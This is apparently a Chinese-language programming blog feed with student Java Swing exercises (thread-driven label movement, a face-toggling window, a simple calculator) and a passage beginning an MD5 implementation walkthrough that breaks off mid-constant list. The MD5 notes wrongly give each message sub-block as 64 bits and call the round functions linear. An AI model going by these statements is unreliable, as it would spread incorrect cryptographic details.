classes.outS_list();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="GUI-多线程-右下移动"><a href="#GUI-多线程-右下移动" class="headerlink" title="GUI+多线程-右下移动"></a>GUI+多线程-右下移动</h1><p>编写两个线程，一个线程可以让标签1向右移动，另一个线程可以让标签2向下移动。主界面上设置一个按钮，可以用来启动上述线程。</p><p>这里为了更好的学习多线程，实现了两种不同的线程。</p><p>使用Thread类实现多线程：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyJFrame2</span> <span class="keyword">extends</span> <span class="title">JFrame</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> WIDTH=<span class="number">300</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> HEIGHT=<span class="number">200</span>;</span><br><span class="line">    JButton button;</span><br><span class="line">    JLabel label1,label2;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyJFrame2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        setTitle(<span class="string">"标签移动"</span>);</span><br><span class="line">        setSize(WIDTH, HEIGHT);</span><br><span class="line">        setLocation(<span class="number">300</span>, <span class="number">200</span>);</span><br><span class="line">        setLayout(<span class="keyword">new</span> FlowLayout());</span><br><span class="line">        button = <span class="keyword">new</span> JButton(<span class="string">"启动线程"</span>);</span><br><span class="line">        label1 = <span class="keyword">new</span> JLabel(<span class="string">"标签1"</span>);</span><br><span class="line">        label2 = <span class="keyword">new</span> JLabel(<span class="string">"标签2"</span>);</span><br><span class="line">        add(button);</span><br><span class="line">        add(label1);</span><br><span class="line">        add(label2);</span><br><span class="line">        setVisible(<span class="keyword">true</span>);</span><br><span class="line">        setDefaultCloseOperation(EXIT_ON_CLOSE);</span><br><span class="line">        button.addActionListener(<span class="keyword">new</span> ActionListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(ActionEvent e)</span> </span>&#123;</span><br><span class="line">                    MyThread1 thread1 = <span class="keyword">new</span> MyThread1(label1);</span><br><span class="line">                    thread1.start();</span><br><span class="line">                    MyThread1 thread2 = <span class="keyword">new</span> MyThread1(label2);</span><br><span class="line">                    thread2.start();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MyThread1</span> <span class="keyword">extends</span> <span class="title">Thread</span></span>&#123;</span><br><span class="line">        JLabel label;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">MyThread1</span><span class="params">(JLabel label)</span></span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.label=label;</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">                <span class="keyword">while</span> (<span class="keyword">true</span>)&#123;</span><br><span class="line">                    <span class="keyword">try</span>&#123;</span><br><span class="line">                        <span class="keyword">if</span>(label==label1) &#123;</span><br><span class="line">                            label1.setLocation(label1.getX() + <span class="number">10</span>, label1.getY());</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span>(label==label2) &#123;</span><br><span class="line">                            label2.setLocation(label2.getX(), label2.getY() + <span class="number">10</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                         Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                     &#125;</span><br><span class="line">                    <span class="keyword">catch</span> (InterruptedException e)&#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> MyJFrame2();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/S31q0MR.png" alt=""></p><p>实现Runnable接口的类的作为参数创建Thread类对象，重载run()方法：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Thread thread1 = <span class="keyword">new</span> Thread(<span class="keyword">new</span> MyThread1(label1));</span><br><span class="line">thread1.start();</span><br><span class="line">Thread thread2 = <span class="keyword">new</span> Thread(<span class="keyword">new</span> MyThread1(label2));</span><br><span class="line">thread2.start();</span><br></pre></td></tr></table></figure></p><h1 id="GUI-多线程-左右移动"><a href="#GUI-多线程-左右移动" class="headerlink" title="GUI+多线程-左右移动"></a>GUI+多线程-左右移动</h1><p>编写一个图形用户界面程序，窗体的宽度300，高度150，布局管理器为null，窗体上有二个标签和二个按钮，标签的位置为（10,30）和（200,60），按钮的位置为（50,100）和（150,100），它们的宽度和高度都是80和20。编写一个线程，该线程可以让标签向右或向左移动10次，每次移动10个单位，间隔1秒，通过按钮的动作事件启动上述线程，“向右走”按钮启动“向右移标签”，“向左走”按钮启动“向左移标签”，界面如下图所示。</p><p>run方法是自动调用的<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Move</span> <span class="keyword">extends</span> <span class="title">JFrame</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> WIDTH=<span class="number">300</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> HEIGHT=<span class="number">200</span>;</span><br><span class="line">    JButton button1,button2;</span><br><span class="line">    JLabel lb1,lb2;</span><br><span class="line">    <span class="keyword">boolean</span> flag;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Move</span><span class="params">()</span></span>&#123;</span><br><span class="line">        setSize(WIDTH, HEIGHT);</span><br><span class="line">        setLayout(<span class="keyword">null</span>);</span><br><span class="line">        setVisible(<span class="keyword">true</span>);</span><br><span class="line">        setDefaultCloseOperation(EXIT_ON_CLOSE);</span><br><span class="line">        lb1=<span class="keyword">new</span> JLabel(<span class="string">"向右移标签"</span>);</span><br><span class="line">        lb2=<span class="keyword">new</span> JLabel(<span class="string">"向左移标签"</span>);</span><br><span class="line">        button1=<span class="keyword">new</span> JButton(<span class="string">"向右走"</span>);</span><br><span class="line">        button2=<span class="keyword">new</span> JButton(<span class="string">"向左走"</span>);</span><br><span class="line">        lb1.setBounds(<span class="number">10</span>,<span class="number">30</span>,<span class="number">80</span>,<span class="number">20</span>);</span><br><span class="line">        lb2.setBounds(<span class="number">200</span>,<span class="number">60</span>,<span class="number">80</span>,<span class="number">20</span>);</span><br><span class="line">        button1.setBounds(<span class="number">50</span>,<span class="number">100</span>,<span class="number">80</span>,<span class="number">20</span>);</span><br><span class="line">        button2.setBounds(<span class="number">150</span>,<span class="number">100</span>,<span class="number">80</span>,<span class="number">20</span>);</span><br><span class="line">        add(lb1);</span><br><span class="line">        add(lb2);</span><br><span class="line">        add(button1);</span><br><span class="line">        add(button2);</span><br><span class="line">        MyListener ml=<span class="keyword">new</span> MyListener();</span><br><span class="line">        button1.addActionListener(ml);</span><br><span class="line">        button2.addActionListener(ml);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MyListener</span> <span class="keyword">implements</span> <span class="title">ActionListener</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(ActionEvent e)</span></span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(e.getSource()==button1)&#123;</span><br><span class="line">                    Thread t1=<span class="keyword">new</span> Thread(<span class="keyword">new</span> MyThread());</span><br><span class="line">                    flag=<span class="keyword">true</span>;</span><br><span class="line">                    t1.start();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(e.getSource()==button2)&#123;</span><br><span class="line">                Thread t2=<span class="keyword">new</span> Thread(<span class="keyword">new</span> MyThread());</span><br><span class="line">                flag=<span class="keyword">false</span>;</span><br><span class="line">                t2.start();</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MyThread</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">                <span class="keyword">while</span> (<span class="keyword">true</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(flag) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++) &#123;</span><br><span class="line">                                lb1.setLocation(lb1.getX()+<span class="number">10</span>, lb1.getY());</span><br><span class="line">                                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                            e.printStackTrace();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(!flag)&#123;</span><br><span class="line">                        <span class="keyword">try</span>&#123;</span><br><span class="line">                            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++) &#123;</span><br><span class="line">                                lb2.setLocation(lb2.getX() - <span class="number">10</span>, lb2.getY());</span><br><span class="line">                                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                            e.printStackTrace();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Move();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/ggBmZmg.png" alt=""></p><h1 id="GUI-变脸"><a href="#GUI-变脸" class="headerlink" title="GUI-变脸"></a>GUI-变脸</h1><p>编写一个“变脸”程序：将实验六第5题中的两个脸合到一个程序中，利用事件处理程序mouseUp()实现程序运行后出现一张笑脸，鼠标点击一次则变成哭脸，再点击一次又变成笑脸，依次轮换。</p><p>paint方法是自动调用的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FaceChange</span> <span class="keyword">extends</span> <span class="title">JFrame</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> b=<span class="keyword">true</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">FaceChange</span><span class="params">()</span></span>&#123;</span><br><span class="line">        setTitle(<span class="string">"变脸怪"</span>);</span><br><span class="line">        setBounds(<span class="number">300</span>,<span class="number">300</span>,<span class="number">400</span>,<span class="number">300</span>);</span><br><span class="line">        setVisible(<span class="keyword">true</span>);</span><br><span class="line">        setDefaultCloseOperation(EXIT_ON_CLOSE);</span><br><span class="line">        <span class="keyword">this</span>.addMouseListener(<span class="keyword">new</span> MouseAdapter()  &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">mouseClicked</span><span class="params">(MouseEvent e)</span> </span>&#123;</span><br><span class="line">                i++;</span><br><span class="line">                <span class="keyword">if</span>(i%<span class="number">2</span>==<span class="number">1</span>) &#123;b=<span class="keyword">false</span>; repaint();&#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;b=<span class="keyword">true</span>; repaint();&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">paint</span><span class="params">(Graphics g)</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.paint(g);</span><br><span class="line">        <span class="keyword">if</span>(b) &#123;</span><br><span class="line">            g.setColor(Color.blue);</span><br><span class="line">            g.drawOval(<span class="number">150</span>, <span class="number">50</span>, <span class="number">150</span>, <span class="number">200</span>);</span><br><span class="line">            g.drawArc(<span class="number">180</span>, <span class="number">85</span>, <span class="number">20</span>, <span class="number">20</span>, <span class="number">180</span>, -<span class="number">180</span>);</span><br><span class="line">            g.drawArc(<span class="number">250</span>, <span class="number">85</span>, <span class="number">20</span>, <span class="number">20</span>, <span class="number">180</span>, -<span class="number">180</span>);</span><br><span class="line">            g.drawArc(<span class="number">200</span>, <span class="number">200</span>, <span class="number">40</span>, <span class="number">30</span>, <span class="number">180</span>, <span class="number">180</span>);</span><br><span class="line">            g.drawString(<span class="string">"笑"</span>, <span class="number">50</span>, <span class="number">100</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            g.setColor(Color.blue);</span><br><span class="line">            g.drawOval(<span class="number">150</span>, <span class="number">50</span>, <span class="number">150</span>, <span class="number">200</span>);</span><br><span class="line">            g.drawArc(<span class="number">180</span>, <span class="number">85</span>, <span class="number">20</span>, <span class="number">20</span>, <span class="number">180</span>, <span class="number">180</span>);</span><br><span class="line">            g.drawArc(<span class="number">250</span>, <span class="number">85</span>, <span class="number">20</span>, <span class="number">20</span>, <span class="number">180</span>, <span class="number">180</span>);</span><br><span class="line">            g.drawArc(<span class="number">200</span>, <span class="number">200</span>, <span class="number">40</span>, <span class="number">30</span>, <span class="number">180</span>, -<span class="number">180</span>);</span><br><span class="line">            g.drawString(<span class="string">"哭"</span>, <span class="number">50</span>, <span class="number">100</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">new</span> FaceChange();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/7I5PZNx.png" alt=""><br><img src="https://i.imgur.com/mrIygEp.png" alt=""></p><h1 id="GUI-计算器"><a href="#GUI-计算器" class="headerlink" title="GUI-计算器"></a>GUI-计算器</h1><p>实现了监听类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Calculator</span> <span class="keyword">extends</span> <span class="title">JFrame</span>  </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> WIDTH = <span class="number">400</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> HEIGHT =<span class="number">200</span>;</span><br><span class="line">    JButton[] buttons = <span class="keyword">new</span> JButton[<span class="number">4</span>];</span><br><span class="line">    TextField tf1,tf2,tf3;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Calculator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        setTitle(<span class="string">"计算器"</span>);</span><br><span class="line">        setLayout(<span class="keyword">new</span> GridLayout(<span class="number">4</span>, <span class="number">1</span>));</span><br><span class="line">        String[] caculate = &#123;<span class="string">"+"</span>, <span class="string">"-"</span>, <span class="string">"*"</span>, <span class="string">"/"</span>&#125;;</span><br><span class="line">        JPanel panel = <span class="keyword">new</span> JPanel();</span><br><span class="line">        panel.setLayout(<span class="keyword">new</span> GridLayout(<span class="number">1</span>,<span class="number">4</span>));</span><br><span class="line">        MyListener ml=<span class="keyword">new</span> MyListener();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">            buttons[i] = <span class="keyword">new</span> JButton(caculate[i]);</span><br><span class="line">            buttons[i].addActionListener(ml);</span><br><span class="line">            panel.add(buttons[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        tf1 = <span class="keyword">new</span> TextField();</span><br><span class="line">        tf2 = <span class="keyword">new</span> TextField();</span><br><span class="line">        tf3 = <span class="keyword">new</span> TextField();</span><br><span class="line">        add(tf1);</span><br><span class="line">        add(tf2);</span><br><span class="line">        add(panel);</span><br><span class="line">        add(tf3);</span><br><span class="line">        setSize(WIDTH, HEIGHT);</span><br><span class="line">        setLocation(<span class="number">300</span>, <span class="number">300</span>);</span><br><span class="line">        setVisible(<span class="keyword">true</span>);</span><br><span class="line">        setDefaultCloseOperation(EXIT_ON_CLOSE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MyListener</span> <span class="keyword">implements</span> <span class="title">ActionListener</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(ActionEvent e)</span></span>&#123;</span><br><span class="line">            <span class="keyword">double</span> a,b,result;</span><br><span class="line">            String bname=e.getActionCommand();</span><br><span class="line">            a=Double.parseDouble(tf1.getText());</span><br><span class="line">            b=Double.parseDouble(tf2.getText());</span><br><span class="line">            <span class="keyword">if</span>(bname.equals(<span class="string">"+"</span>))&#123;</span><br><span class="line">                result=a+b;</span><br><span class="line">                tf3.setText(result+<span class="string">" "</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(bname.equals(<span class="string">"-"</span>))&#123;</span><br><span class="line">                result=a-b;</span><br><span class="line">                tf3.setText(result+<span class="string">" "</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(bname.equals(<span class="string">"*"</span>))&#123;</span><br><span class="line">                result=a*b;</span><br><span class="line">                tf3.setText(result+<span class="string">" "</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(bname.equals(<span class="string">"/"</span>))&#123;</span><br><span class="line">                result=a/b;</span><br><span class="line">                tf3.setText(result+<span class="string">" "</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Calculator();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/29KIyPK.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;类编程&quot;&gt;&lt;a href=&quot;#类编程&quot; class=&quot;headerlink&quot; title=&quot;类编程&quot;&gt;&lt;/a&gt;类编程&lt;/h1&gt;&lt;p&gt;  类Person:&lt;br&gt;          属性：编号、姓名、性别；&lt;br&gt;          构造方法：确定编号和姓名；&lt;br
      
    
    </summary>
    
      <category term="java" scheme="http://yoursite.com/categories/java/"/>
    
    
      <category term="java" scheme="http://yoursite.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>MD5实现</title>
    <link href="http://yoursite.com/2018/12/27/MD5/"/>
    <id>http://yoursite.com/2018/12/27/MD5/</id>
    <published>2018-12-26T16:00:00.000Z</published>
    <updated>2018-12-28T08:01:39.871Z</updated>
    
    <content type="html"><![CDATA[<h1 id="hash函数实现"><a href="#hash函数实现" class="headerlink" title="hash函数实现"></a>hash函数实现</h1><ol><li>update() 函数把字典参数 dict2 的 key/value(键/值) 对更新到字典 dict 里。</li><li><p>hash.update(arg)<br>该方法只接受byte类型，否则会报错.<br>重复调用update(arg)方法，是会将传入的arg参数进行拼接，而不是覆盖</p></li><li><p>hash.new(name[,data])<br>name传入哈希机密算法名称(md5)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">genearteMD5</span><span class="params">(str)</span>:</span></span><br><span class="line">    <span class="comment"># 创建md5对象</span></span><br><span class="line">    hl = hashlib.md5()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Tips</span></span><br><span class="line">    <span class="comment"># 此处必须声明encode</span></span><br><span class="line">    <span class="comment"># 否则报错为：hl.update(str)    Unicode-objects must be encoded before hashing</span></span><br><span class="line">    hl.update(str.encode(encoding=<span class="string">'utf-8'</span>))</span><br><span class="line"></span><br><span class="line">    print(<span class="string">'MD5加密前为 ：'</span> + str)</span><br><span class="line">    print(<span class="string">'MD5加密后为 ：'</span> + hl.hexdigest())</span><br></pre></td></tr></table></figure></li></ol><h1 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h1><p>1) Little-Endian就是低位字节排放在内存的低地址端，高位字节排放在内存的高地址端。<br>2) Big-Endian就是高位字节排放在内存的低地址端，低位字节排放在内存的高地址端。</p><h1 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h1><p>md5的输入为512位的倍数，输出为128位。</p><h2 id="填充"><a href="#填充" class="headerlink" title="填充"></a>填充</h2><p>填充的方法是填充一个1和n个0，信息的长度就为N*512+448(bit),将原始消息长度用64位附加在填充结果后，消息长度为512比特整数倍。</p><h2 id="初始化链接变量（小端模式）"><a href="#初始化链接变量（小端模式）" class="headerlink" title="初始化链接变量（小端模式）"></a>初始化链接变量（小端模式）</h2><p>（A=0X67452301L，B=0XEFCDAB89L，C=0X98BADCFEL，D=0X10325476L）</p><h2 id="四轮循环"><a href="#四轮循环" class="headerlink" title="四轮循环"></a>四轮循环</h2><p>将每一512bit细分成16个小组，每个小组64位（8个字节）(M0~M15)</p><h3 id="四个线性函数"><a href="#四个线性函数" class="headerlink" title="四个线性函数"></a>四个线性函数</h3><p>F(X,Y,Z)=(X&amp;Y)|((~X)&amp;Z)<br>G(X,Y,Z)=(X&amp;Z)|(Y&amp;(~Z))<br>H(X,Y,Z)=X^Y^Z<br>I(X,Y,Z)=Y^(X|(~Z))</p><p>设Mj表示消息的第j个子分组（从0到15），&lt;&lt;</p><p>FF(a,b,c,d,Mj,s,ti)表示a=b+((a+F(b,c,d)+Mj+ti)&lt;&lt;&lt;s)<br>GG(a,b,c,d,Mj,s,ti)表示a=b+((a+G(b,c,d)+Mj+ti)&lt;&lt;&lt;s)<br>HH(a,b,c,d,Mj,s,ti)表示a=b+((a+H(b,c,d)+Mj+ti)&lt;&lt;&lt;s)<br>II(a,b,c,d,Mj,s,ti)表示a=b+((a+I(b,c,d)+Mj+ti)&lt;&lt;&lt;s)</p><p>ti=[0xd76aa478, 0xe8c7b756, 0x242070db, 0xc1bdceee, 0xf57c0faf,  